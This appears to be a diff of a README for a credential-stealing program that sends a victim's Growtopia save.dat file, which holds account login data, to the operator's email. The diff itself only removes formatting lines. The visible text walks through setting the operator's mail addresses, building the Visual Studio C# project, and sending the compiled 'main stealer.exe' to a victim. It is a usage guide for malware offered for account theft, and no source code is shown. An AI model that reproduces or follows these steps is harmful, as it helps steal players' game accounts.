@@ -2,7 +2,6 @@
 A program that allows you to send you the victim's save.dat in Growtopia.
 
 ## **IMPORTANT THINGS**
----
 ### Don't forgot to change mails.
 
 ## **Do these steps before running the program**
@@ -16,7 +15,6 @@ A program that allows you to send you the victim's save.dat in Growtopia.
 ![Pic1](https://www.linkpicture.com/q/asddsa.png)
 
 ## Getting ready for debugging
----
 1. Install Visual Studio C# 2019 if you dont have. (Can find tutorials on [Youtube](https://www.youtube.com/ "Google Search"))
     * [Example tutorial](https://www.youtube.com/watch?v=Bu26MZAv12E "Google Search")
 2. Open _main stealer.sln_ file with **Visual Studio**
@@ -25,12 +23,10 @@ A program that allows you to send you the victim's save.dat in Growtopia.
 5. Double click on and open it
 
 ## Debugging
----
 1. Set build to Debug x64 (x64 is not necessarily)
 2. Build the project (If you don't build it then next step won't work)
 
 ## Sending .exe file to the victim
----
 1. Open the **_main stealer_** folder that you downloaded
 2. Open _Bin_ folder and then open the _Debug_ folder
 3. You will see _main stealer.exe_ file
